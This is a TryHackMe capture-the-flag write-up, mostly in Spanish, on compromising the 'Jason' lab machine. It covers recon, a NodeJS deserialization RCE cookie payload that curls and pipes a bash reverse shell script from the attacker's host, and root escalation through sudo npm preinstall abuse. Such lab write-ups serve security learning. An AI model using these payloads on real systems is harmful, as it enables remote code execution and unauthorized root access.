---
layout: single
title: Jason - TryHackMe
excerpt: " We are Horror LLC, we specialize in horror, but one of the scarier aspects of our company is our front-end webserver. We can't launch our site in its current state and our level of concern regarding our cybersecurity is growing exponentially. We ask that you perform a thorough penetration test and try to compromise the root account. There are no rules for this engagement. Good luck!"
date: 2023-02-04
classes: wide
header:
  teaser: /blog/assets/images/thm-writeup-jason/jason.jpg
  teaser_home_page: true
  icon: /blog/assets/images/tryhackme.webp
categories:
  - tryhackme
tags:
  - javascript
  - nodejs
  - deserialization
  - burpsuite
  - base64
---

**We are Horror LLC,** we specialize in horror, but one of the scarier aspects of our company is our front-end webserver. We can't launch our site in its current state and our level of concern regarding our cybersecurity is growing exponentially. We ask that you perform a thorough penetration test and try to compromise the root account. There are no rules for this engagement. Good luck!

# Summary
- IP: 10.10.192.33
- Ports: 22,80
- OS: Linux (Ubuntu)
- Services & Applications:
	-  22 -> OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
	-  80 -> http

# Recon

- Escaneo básico de puertos:

```bash
$nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 10.10.192.33 -oG allPorts
```


- Escaneo profundo de puertos encontrados:

```bash
$nmap -p22,80 -sCV 10.10.192.33 -oN targeted
```



# Análisis de página web usando Burpsuite:

- Entramos a la página web por el puerto 80 y vemos el siguiente mensaje: "Coming soon! Please sign up to our newsletter to receive updates."

- Adjunto también vemos un campo el cual se debe llenar con el email en el cual se quiere recibir las noticias de la página web en supuesta construcción.

- Al no encontrar nada más interesante, ingresamos un dato ramdon en el campo de "email" y le damos en "submit", inmediatamente nos damos cuenta que el dato que hemos ingresado se nos representa en el output de la página: "We'll keep you updated at: test@test.com"

	- Esto nos sugiere un posible XSS, sin embargo hacemos un análisis más profundo con Burpsuite.

- Ingresamos otro dato aleatorio y antes de dar en "submit" abrimos burpsuite e interceptamos la petición.

- En la respuesta por parte del servidor podemos ver la siguiente linea:

```http
Set-Cookie: session=eyJlbWFpbCI6InRlc3RAdGVzdC5jb20ifQ==; Max-Age=900000; HttpOnly, Secure
```

- Deducimos que la página web por detrás está estableciendo como cookie el valor representado, actualizamos la página principal interceptando de nuevo con Burpsuite para comprobar que la cookie se haya almacenado con el valor que vimos, obteniendo una petición GET con el siguiente contenido:

```http
GET / HTTP/1.1

Host: 10.10.192.33

User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

DNT: 1

Connection: close

Cookie: session=eyJlbWFpbCI6InRlc3RAdGVzdC5jb20ifQ==

Upgrade-Insecure-Requests: 1
```

- Como podemos ver, la cookie efectivamente se almacenó con el valor adjudicado en la petición anterior, mandamos esta petición al repeater de Burpsuite y analizamos el código cifrado:

```bash
$echo -n "eyJlbWFpbCI6InRlc3RAdGVzdC5jb20ifQ==" | base64 -d
```

- Lo cual nos devuelve el siguiente output:

```
{"email":"test@test.com"}
```

- Esto nos hace pensar que por detrás la página web está usando el formado json, el cual almacena el dato que nosotros ingresamos como cookie, serializándolo y haciendo el proceso inverso quedando este cifrado en base64.



# Explotación de NodeJS deserialization RCE:


- Buscamos vulnerabilidades que contemplen la serialización con NodeJS, posible framework ocupado en la actual página, y encontramos el siguiente archivo: [www.exploit-db.com](https://www.exploit-db.com/docs/english/41289-exploiting-node.js-deserialization-bug-for-remote-code-execution.pdf)

- Analizando el contenido del archivo, podemos ver detalladamente en que consisten las funciones "serialize" y "unserialize" en JS, obteniendo como resultado final el siguiente payload:

```json
{"rce":"_$$ND_FUNC$$_function (){\n \t require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });\n }()"}
```


- Adecuamos el payload de acuerdo a los datos de la página en la que estamos trabajando, tratando de ejecutar una reverse shell básica, para esto, seguimos los siguientes pasos:

- Creamos una script "shell.sh" el cual contendrá la reverse shell:

```bash
$nano shell.sh
```

```bash
bash -i >& /dev/tcp/10.18.101.123/443 0>&1
```

- Iniciamos un servidor HTTP con python para poder acceder a la script creada:

```bash
$python3 -m http.server
```

- Ahora modificamos el payload antes encontrado para que ejecute un curl el cual establecerá un enlace con el archivo que hemos creado:

```json
{"email":"_$$ND_FUNC$$_function (){require('child_process').exec('curl http://10.18.101.123:8000/shell.sh | bash', function(error, stdout, stderr) { console.log(stdout) }); }()"}
```

- Con todo esto hecho, lo único que resta por hacer es ponernos en escucha en nuestra máquina atacante por el puerto 443 y cifrar el payload en base64 para mandarlo a la petición del repeater en Burpsuite:

- Usando el decoder de burpsuite podemos encodear el payload en base64, obteniendo la siguiente cadena:

```base64
eyJlbWFpbCI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbiAoKXtyZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlYygnY3VybCBodHRwOi8vMTAuMTguMTAxLjEyMzo4MDAwL3NoZWxsLnNoIHwgYmFzaCcsIGZ1bmN0aW9uKGVycm9yLCBzdGRvdXQsIHN0ZGVycikgeyBjb25zb2xlLmxvZyhzdGRvdXQpIH0pOyB9KCkifQ==
```


- Agregamos la cadena encodeada en donde antes estaba la cookie de la petición GET en el repeater de Burpsuite y damos en SEND:

- Habremos ganado acceso al sistema como el usuario "dylan"; hacemos el respectivo tratamiento de la tty.




# ESCALANDO PRIVILEGIOS:


- Vemos permisos de sudoers (sudo -l) y encontramos lo siguiente:

```
User dylan may run the following commands on jason:
    (ALL) NOPASSWD: /usr/bin/npm *
```

- Es decir, siendo el usuario "dylan" podemos ejecutar con el binario "npm" cualquier fichero, todo esto como root sin otorgar contraseña; hacemos una búsqueda en gtfobins para hallar una forma de escalar privilegios usando este binario, y encontramos los siguientes comandos:

```
TF=$(mktemp -d)
echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
sudo npm -C $TF --unsafe-perm i
```

- Ejecutamos los comandos y seremos root.
